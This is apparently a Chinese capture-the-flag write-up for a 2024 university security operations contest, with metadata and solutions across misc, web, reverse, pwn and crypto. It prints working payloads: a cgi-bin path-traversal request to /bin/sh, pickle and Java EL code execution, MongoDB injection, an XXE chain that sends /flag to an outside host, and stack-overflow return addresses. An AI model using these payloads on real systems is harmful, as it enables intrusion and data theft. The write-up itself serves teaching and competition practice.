---
title: 2024 首届高校网络安全管理运维赛 Writeup
contest: 2024 首届高校网络安全管理运维赛
year: 2024
difficulty: medium
vuln_type: [misc_unknown, sqli, ssti, xxe, rop, ret2libc, deserialize, web_unknown]
tags: [gif 帧分离 rot13, 钓鱼邮件 base64, 冰蝎 e45e329feb5d925b 默认密钥, zip CRC 32 明文攻击, sqlite 索引解析, /cgi-bin/..%2e.. 路径穿越, MongoDB $toString, javax.script.ScriptEngineManager JS eval, XXE php://filter base64, z3 符号执行逆向, 栈溢出 0x38 p64 backdoor, 洗牌 instance m n 期望区分]
attack_chain:
  - Misc 签到: gif 帧分离 + rot13 解密 synt{fvtava-dhvm-jryy-qbar}
  - 钓鱼邮箱 Flag1: base64 解密发件人
  - 钓鱼邮箱 Flag2: base64 解密邮件内容
  - 钓鱼邮箱 Flag3: VirusTotal 查 foobar-edu-cn.com + SPF/DKIM/DMARC dnsspy
  - easyshell: 冰蝎默认密钥 e45e329feb5d925b 解倒数第二个 + CRC32 明文攻击 A8s123/+*
  - SecretDB: sqlite 格式解析 索引/值 + passwd_decode 自定义映射
  - /cgi-bin/..%2e 路径穿越到 /bin/sh 反弹 cat /fl*
  - Pickle opcode: cconfig notadmin (S'admin' S'yes' u0(cconfig backdoor (S'exec...') lo.
  - MongoDB: {"username": {"$toString": "admin"}} 1'||'
  - Java EL: javax.script.ScriptEngineManager JS eval 盲注 /flag 字符
  - XXE: php://filter base64 /flag + 外部 dtd 二次回传
  - reverse: z3 解 4 段 32-bit 位运算 a1=0xe3c6235c a2=0x05d9434d a3=0x04b1edf3 a4=0x04034083
  - pwn: 栈溢出 0x38 + p64(0x40117A) backdoor / pwn03 admin+密码 0x9e 填充 + p64(0x40127E)
  - crypto: shuffle m n instance 蒙特卡洛 2000 次 → 1/0 期望区分 bit
key_payload: "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
one_liner: 高校运维赛综合：签到 ROT13+钓鱼邮件+冰蝎+sqlite+路径穿越+Pickle+MongoDB+Java EL 盲注+XXE+z3+栈溢出+洗牌期望——运维/渗透/密码/取证全覆盖。
lesson: /cgi-bin/.%2e/ 路径穿越是 HTTPD 经典 CVE（CVE-2021-41773/CVE-2021-42013 同款），打 Apache httpd 时要记得试；Java EL 盲注用 `contains` 逐字符爆破比 time-based 快；洗牌密码用蒙特卡洛多次实验取期望差分判断 bit 是统计侧信道套路。
quality: high
---

# 2024 首届高校网络安全管理运维赛 Writeup

## Misc 签到
gif 多帧分离，flag 文本帧 + rot13：`synt{fvtava-dhvm-jryy-qbar}` → rot13 → `flag{image-way-well-done}`。

## 钓鱼邮箱识别
- Flag1/2：发件人/邮件内容 base64 解密  
- Flag3：VirusTotal 查 `foobar-edu-cn.com` → 走 SPF/DKIM/DMARC `dnsspy.io` 拿记录

## easyshell（冰蝎流量）
- http 流过滤冰蝎 WebShell  
- 默认密钥 `e45e329feb5d925b` 解倒数第二个包 → 读 secret.txt → 同密钥再解一段 → 拿压缩包  
- CRC32 同值 → 明文攻击爆破 → 密码 `A8s123/+*` → 解压拿 flag

## SecretDB（sqlite）
按 sqlite 文件格式手撕 page+cell，提取索引和值。密码是 `&` 分隔的 ASCII 码：
```python
def passwd_decode(code):
    passwd_list = map(int, code.split('&'))
    result = []
    for i in passwd_list:
        if 97 <= i <= 100 or 65 <= i <= 68: i += 22  # a-d/A-D → 0-3
        elif i > 57: i -= 4
        result.append(chr(i))
    return ''.join(result)
# flag{ad1985868133e8cf1828cb84adbe5a5b}
```

## HTTP 路径穿越
```
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
echo; cat /fl*;
```
`/nc` 转发：`port=80&data=[urlencode_data]`。

## Pickle 内存马
```python
opcode = b'''cconfig
notadmin
(S'admin'
S'yes'
u0(cconfig
backdoor
(S'exec(__import__("base64").b64decode(b"%s"))'
lo.''' % (base64.b64encode(b"raise Exception(__import__('os').popen('cat /fl*').read())"))
```

## MongoDB 弱类型
`{"username": {"$toString": "admin"}}` 配合 `1'||'` 注入。

## Java EL 盲注
```python
data = {"expr": '''new javax.script.ScriptEngineManager().getEngineByName("JS").eval(
  'a=(new java.lang.String(java.nio.file.Files.readAllBytes(
    java.nio.file.Paths.get("/flag"))).contains("''' + text + '''"))?x:0'
)'''}
# 长度 == 105 → 命中
```

## XXE
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://[IP]/tmp.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>
```
外部 dtd：
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://[IP]/tmp.xml?file=%data;'>">
```

## reverse：z3 符号执行
4 段 32-bit 位运算，z3 求解：
- a1 = 0xADB1D018 + 0x36145344 = 0xe3c6235c  
- a2: `(a2|0x8E03BEC3) - 3*(a2&0x71FC413C) + a2 == -1876131848` → 0x05d9434d  
- a3: `4*((~a3&0xA8453437)+2*~(~a3|0xA8453437))+-3*(~a3|0xA8453437)+3*~(a3|0xA8453437)-(-10*(a3&0xA8453437)+(a3^0xA8453437))==551387557` → 0x04b1edf3  
- a4: `11*~(a4^0xE33B67BD)+4*~(~a4|0xE33B67BD)-(6*(a4&0xE33B67BD)+12*~(a4|0xE33B67BD))+3*(a4&0xD2C7FC0C)+(-5)*a4-(2*~(a4|0xD2C7FC0C))+(~(a4|0x2D3803F3))+(4*(a4&0x2D3803F3))-((-2)*(a4|0x2D3803F3))==(-837785892)` → 0x04034083  
- flag: `flag{e3c6235c-05d9434d-04b1edf3-04034083}`

## pwn
- pwn: 栈溢出 0x38 字节 + p64(0x40117A) backdoor  
- pwn03: `admin\n1q2w3e4r` + ljust(0x9e, b'b') + p64(0x40127E) 二次 ret

## crypto：shuffle 期望侧信道
```python
def instance(m, n):
    start = list(range(m)); shuffle(start)
    for i in range(m):
        now = start[i]; this_turn = False
        for j in range(n-1):
            if now == i: this_turn = True; break
            now = start[now]
        if not this_turn: return 0
    return 1
# 2000 次蒙特卡洛取 bit 期望差异
# flag{this_1s_the_sEcret_f1ag}
```
